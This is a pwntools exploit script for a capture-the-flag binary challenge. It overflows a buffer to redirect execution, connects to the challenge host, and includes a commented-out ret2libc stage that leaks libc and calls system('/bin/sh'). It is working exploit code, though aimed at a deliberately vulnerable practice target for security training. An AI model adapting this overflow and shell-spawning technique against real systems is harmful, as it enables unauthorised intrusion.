#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'generic-rop-challenge.chal.imaginaryctf.org', 42042

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', exe] + argv)

gdbscript = '''
init-pwndbg
break *main+12
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 64 + 8

# flattening  payload here
payload = flat({
    offset: [
        0x4008c8
    ]
})

io.sendlineafter(b'payload below', payload)

# io.recvline()
# leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
# info('puts: %#x', leak)

# # libc6_2.31-13_amd64 
# libc.address = leak - 0x0765f0
# binsh = libc.address + 0x18a152
# system = libc.address + 0x048e50

# info('libc: %#x', libc.address)
# info('/bin/sh: %#x', binsh)
# info('system: %#x', system)

# # flattening  payload here
# payload = flat({
#     offset: [
#         rop.rdi.address,
#         binsh,
#         system
#     ]
# })

# io.sendlineafter(b'payload below', payload)

io.interactive()